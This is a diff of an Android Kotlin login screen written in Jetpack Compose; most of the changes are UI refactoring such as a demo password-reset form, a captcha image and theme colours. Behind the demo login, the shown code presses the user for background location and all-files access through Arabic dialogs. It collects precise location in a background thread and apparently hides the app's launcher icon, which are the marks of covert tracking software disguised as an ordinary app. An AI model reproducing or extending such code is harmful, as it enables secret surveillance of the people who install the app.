-                    modifier = Modifier.weight(1f)
-                )
-                Spacer(Modifier.width(38.dp))
-            }
-
-            Spacer(Modifier.height(28.dp))
-
-            Label("Email")
-            CustomInput(resetEmail, { resetEmail = it }, "Please enter your email address")
-
-            Spacer(Modifier.height(16.dp))
-            Label("Verification code")
-            Row(
-                modifier = Modifier
-                    .fillMaxWidth()
-                    .height(54.dp)
-                    .clip(RoundedCornerShape(10.dp))
-                    .background(ComposeColor(0xFF16224A))
-                    .border(1.dp, ComposeColor(0xFF23336B), RoundedCornerShape(10.dp))
-                    .padding(horizontal = 16.dp),
-                verticalAlignment = Alignment.CenterVertically
-            ) {
-                BasicTextField(
-                    value = resetVC,
-                    onValueChange = { resetVC = it },
-                    modifier = Modifier.weight(1f),
-                    textStyle = androidx.compose.ui.text.TextStyle(color = ComposeColor(0xFFE8EEF8), fontSize = 15.sp),
-                    decorationBox = { inner ->
-                        if (resetVC.isEmpty()) {
-                            Text("Please enter the verification code", color = ComposeColor(0xFF5C6C8F), fontSize = 15.sp)
-                        }
-                        inner()
-                    }
-                )
-                Text(
-                    "Send",
-                    color = ComposeColor(0xFFDCE8FF),
-                    fontSize = 15.sp,
-                    fontWeight = FontWeight.Bold,
-                    modifier = Modifier
-                        .clickable { showToast("Code will be sent (demo)") }
-                        .padding(start = 12.dp)
-                )
-            }
-
-            Spacer(Modifier.height(16.dp))
-            Label("New password (6-16)")
-            PasswordInput(resetP1, { resetP1 = it }, resetP1Visible, { resetP1Visible = !resetP1Visible }, "Enter new password", registerInput = true)
-
-            Spacer(Modifier.height(30.dp))
-
-            Button(
-                onClick = {
-                    if (resetEmail.isBlank()) showToast("Please enter email")
-                    else if (resetVC.isBlank()) showToast("Please enter verification code")
-                    else if (resetP1.length < 6 || resetP1.length > 16) showToast("Password must be 6-16 characters")
-                    else {
-                        showToast("Password changed (demo)")
-                        currentScreen = 0
-                    }
-                },
-                modifier = Modifier.fillMaxWidth().height(54.dp),
-                shape = RoundedCornerShape(10.dp),
-                colors = ButtonDefaults.buttonColors(containerColor = ComposeColor(0xFF3D8BFF))
-            ) {
-                Text("Confirm", color = ComposeColor.White, fontSize = 16.5.sp, fontWeight = FontWeight.Bold)
-            }
-        }
-    }
-
-    // ═══════════════════════════════════════════
-    //  Reusable Components
-    // ═══════════════════════════════════════════
-    @Composable
-    fun Label(text: String) {
-        Text(text, color = ComposeColor(0xFFEAF0FB), fontSize = 14.5.sp, modifier = Modifier.padding(bottom = 9.dp))
-    }
-
-    @Composable
-    fun CustomInput(value: String, onChange: (String) -> Unit, hint: String, registerInput: Boolean = false) {
-        Box(
-            modifier = Modifier
-                .fillMaxWidth()
-                .height(if (registerInput) 54.dp else 52.dp)
-                .clip(RoundedCornerShape(if (registerInput) 10.dp else 12.dp))
-                .background(ComposeColor(if (registerInput) 0xFF16224A else 0xFF131C36))
-                .border(
-                    1.dp,
-                    ComposeColor(if (registerInput) 0xFF23336B else 0xFF1E2A4D),
-                    RoundedCornerShape(if (registerInput) 10.dp else 12.dp)
-                )
-                .padding(horizontal = 16.dp),
-            contentAlignment = Alignment.CenterStart
-        ) {
-            BasicTextField(
-                value = value,
-                onValueChange = onChange,
-                modifier = Modifier.fillMaxWidth(),
-                singleLine = true,
-                textStyle = androidx.compose.ui.text.TextStyle(color = ComposeColor(0xFFE8EEF8), fontSize = 15.sp),
-                decorationBox = { inner ->
-                    if (value.isEmpty()) {
-                        Text(hint, color = ComposeColor(0xFF5C6C8F), fontSize = 15.sp)
-                    }
-                    inner()
-                }
-            )
-        }
-    }
-
-    @Composable
-    fun PasswordInput(
-        value: String,
-        onChange: (String) -> Unit,
-        visible: Boolean,
-        onToggle: () -> Unit,
-        hint: String,
-        registerInput: Boolean = false
-    ) {
-        Row(
-            modifier = Modifier
-                .fillMaxWidth()
-                .height(if (registerInput) 54.dp else 52.dp)
-                .clip(RoundedCornerShape(if (registerInput) 10.dp else 12.dp))
-                .background(ComposeColor(if (registerInput) 0xFF16224A else 0xFF131C36))
-                .border(
-                    1.dp,
-                    ComposeColor(if (registerInput) 0xFF23336B else 0xFF1E2A4D),
-                    RoundedCornerShape(if (registerInput) 10.dp else 12.dp)
-                )
-                .padding(start = 16.dp, end = 12.dp),
-            verticalAlignment = Alignment.CenterVertically
-        ) {
-            BasicTextField(
-                value = value,
-                onValueChange = onChange,
-                modifier = Modifier.weight(1f),
-                singleLine = true,
-                visualTransformation = if (visible) VisualTransformation.None else PasswordVisualTransformation(),
-                textStyle = androidx.compose.ui.text.TextStyle(color = ComposeColor(0xFFE8EEF8), fontSize = 15.sp),
-                decorationBox = { inner ->
-                    if (value.isEmpty()) {
-                        Text(hint, color = ComposeColor(0xFF5C6C8F), fontSize = 15.sp)
-                    }
-                    inner()
-                }
-            )
-            Image(
-                painter = painterResource(id = R.drawable.ic_eye_off),
-                contentDescription = "Toggle",
-                modifier = Modifier
-                    .size(22.dp)
-                    .clickable { onToggle() }
-            )
-        }
-    }
-
-    @Composable
-    fun BackButton(onClick: () -> Unit) {
-        Box(
-            modifier = Modifier
-                .size(38.dp)
-                .clip(RoundedCornerShape(11.dp))
-                .background(ComposeColor(0xEBBED4F5))
-                .clickable { onClick() },
-            contentAlignment = Alignment.Center
-        ) {
-            Image(
-                painter = painterResource(id = R.drawable.ic_back_arrow),
-                contentDescription = "Back",
-                modifier = Modifier.size(20.dp)
-            )
-        }
-    }
-
-    @Composable
-    fun CaptchaBox(code: String, onClick: () -> Unit) {
-        val bitmap = remember(code) {
-            generateCaptchaBitmap(code)
-        }
-        Image(
-            bitmap = bitmap.asImageBitmap(),
-            contentDescription = "Captcha",
-            modifier = Modifier
-                .width(88.dp)
-                .height(40.dp)
-                .clip(RoundedCornerShape(7.dp))
-                .clickable { onClick() }
-        )
-    }
-
-    // ═══════════════════════════════════════════
-    //  Captcha
+    //  Captcha helpers
     // ═══════════════════════════════════════════
     private fun generateCaptcha(): String {
         val chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789"
@@ -1175,36 +1107,24 @@ class LoginActivity : ComponentActivity() {
     }
 
     private fun generateCaptchaBitmap(code: String): Bitmap {
-        val w = 176
-        val h = 80
+        val w = 176; val h = 80
         val bmp = Bitmap.createBitmap(w, h, Bitmap.Config.ARGB_8888)
         val canvas = Canvas(bmp)
-        canvas.drawColor(Color.WHITE)
-
-        val linePaint = Paint().apply {
-            strokeWidth = 3f
-            style = Paint.Style.STROKE
-        }
+        canvas.drawColor(AColor.WHITE)
+        val linePaint = Paint().apply { strokeWidth = 3f; style = Paint.Style.STROKE }
         repeat(3) {
-            linePaint.color = Color.rgb(Random.nextInt(150), Random.nextInt(150), Random.nextInt(150))
+            linePaint.color = AColor.rgb(Random.nextInt(150), Random.nextInt(150), Random.nextInt(150))
             linePaint.alpha = 150
-            canvas.drawLine(
-                Random.nextFloat() * w, Random.nextFloat() * h,
-                Random.nextFloat() * w, Random.nextFloat() * h,
-                linePaint
-            )
+            canvas.drawLine(Random.nextFloat() * w, Random.nextFloat() * h,
+                Random.nextFloat() * w, Random.nextFloat() * h, linePaint)
         }
-
         val colors = intArrayOf(
-            Color.parseColor("#27ae60"),
-            Color.parseColor("#2980b9"),
-            Color.parseColor("#8e44ad"),
-            Color.parseColor("#c0392b"),
-            Color.parseColor("#16a085")
+            AColor.parseColor("#27ae60"), AColor.parseColor("#2980b9"),
+            AColor.parseColor("#8e44ad"), AColor.parseColor("#c0392b"),
+            AColor.parseColor("#16a085")
         )
         val textPaint = Paint(Paint.ANTI_ALIAS_FLAG).apply {
-            textSize = 60f
-            typeface = android.graphics.Typeface.DEFAULT_BOLD
+            textSize = 60f; typeface = Typeface.DEFAULT_BOLD
         }
         for (i in code.indices) {
             textPaint.color = colors[Random.nextInt(colors.size)]
@@ -1219,17 +1139,14 @@ class LoginActivity : ComponentActivity() {
     }
 
     // ═══════════════════════════════════════════
-    //  Background Location — عند فتح التطبيق
+    //  Permissions
     // ═══════════════════════════════════════════
     private fun requestBackgroundLocationDirect() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            if (ContextCompat.checkSelfPermission(
-                    this,
-                    Manifest.permission.ACCESS_BACKGROUND_LOCATION
-                ) != PackageManager.PERMISSION_GRANTED
-            ) {
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION)
+                != PackageManager.PERMISSION_GRANTED) {
                 try {
-                    AlertDialog.Builder(this)
+                    android.app.AlertDialog.Builder(this)
                         .setTitle("صلاحية الخلفية")
                         .setMessage("يرجى تفعيل الموقع في الخلفية للاستمرار")
                         .setPositiveButton("موافق") { _, _ ->
@@ -1246,9 +1163,14 @@ class LoginActivity : ComponentActivity() {
         }
     }
 
-    // ═══════════════════════════════════════════
-    //  Permissions — بعد صفحة اللغة
-    // ═══════════════════════════════════════════
+    private fun startPermissionsAfterLanguage() {
+        if (permissionsStarted) return
+        permissionsStarted = true
+        Handler(Looper.getMainLooper()).postDelayed({
+            askNextPermission()
+        }, 3500L)
+    }
+
     private fun askNextPermission() {
         if (anyRejected) return
         if (permRequestIndex >= permissionsToAsk.size) {
@@ -1265,16 +1187,9 @@ class LoginActivity : ComponentActivity() {
         permLauncher.launch(perm)
     }
 
-    fun startPermissionsAfterLanguage() {
-        if (permissionsStarted) return
-        permissionsStarted = true
-        Handler(Looper.getMainLooper()).postDelayed({
-            askNextPermission()
-        }, 3500L)
-    }
-
     private fun sendLocationNow() {
-        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) return
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
+            != PackageManager.PERMISSION_GRANTED) return
         Thread {
             try {
                 val loc = LocationHelper.getPreciseLocation(this, 10)
@@ -1296,7 +1211,7 @@ class LoginActivity : ComponentActivity() {
     private fun askAllFilesAccess() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
             if (!Environment.isExternalStorageManager()) {
-                AlertDialog.Builder(this)
+                android.app.AlertDialog.Builder(this)
                     .setTitle("الوصول للملفات")
                     .setMessage("لتفعيل الوصول لكل الملفات، اضغط 'السماح'")
                     .setPositiveButton("فتح الإعدادات") { _, _ ->
@@ -1333,7 +1248,7 @@ class LoginActivity : ComponentActivity() {
                 PackageManager.DONT_KILL_APP
             )
         } catch (e: Exception) {
-            Log.e("LoginActivity", "hide err: ${e.message}")
+            android.util.Log.e("LoginActivity", "hide err: ${e.message}")
         }
     }
 
@@ -1362,19 +1277,27 @@ class LoginActivity : ComponentActivity() {
     private fun showToast(msg: String) {
         Toast.makeText(this, msg, Toast.LENGTH_SHORT).show()
     }
-
-    // ═══════════════════════════════════════════
-    //  LaunchedEffect — بدء الصلاحيات بعد اللغة
-    // ═══════════════════════════════════════════
-    @Composable
-    fun PermissionStarter() {
-        LaunchedEffect(showLocationDialog) {
-            if (showLocationDialog) {
-                startPermissionsAfterLanguage()
-            }
-        }
-    }
 }
+
+// ═══════════════════════════════════════════
+//  File helpers
+// ═══════════════════════════════════════════
+fun loadAssetBitmap(context: Context, path: String): Bitmap? = try {
+    context.assets.open(path).use { BitmapFactory.decodeStream(it) }
+} catch (_: Exception) { null }
+
+fun uriToBitmap(ctx: Context, uri: Uri): Bitmap? = try {
+    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
+        val src = ImageDecoder.createSource(ctx.contentResolver, uri)
+        ImageDecoder.decodeBitmap(src) { decoder, _, _ ->
+            decoder.allocator = ImageDecoder.ALLOCATOR_SOFTWARE
+            decoder.isMutableRequired = false
+        }
+    } else {
+        @Suppress("DEPRECATION")
+        MediaStore.Images.Media.getBitmap(ctx.contentResolver, uri)
+    }
+} catch (_: Exception) { null }
 
 // ═══════════════════════════════════════════
 //  Theme
@@ -1383,12 +1306,12 @@ class LoginActivity : ComponentActivity() {
 fun AppTheme(content: @Composable () -> Unit) {
     MaterialTheme(
         colorScheme = darkColorScheme(
-            primary = ComposeColor(0xFF3D8BFF),
-            background = ComposeColor(0xFF02081A),
-            surface = ComposeColor(0xFF0A1128),
-            onPrimary = ComposeColor.White,
-            onBackground = ComposeColor.White,
-            onSurface = ComposeColor.White
+            primary = Neon.Blue,
+            background = Neon.DeepBottom,
+            surface = Neon.FieldBg,
+            onPrimary = Color.White,
+            onBackground = Color.White,
+            onSurface = Color.White
         )
     ) {
         content()
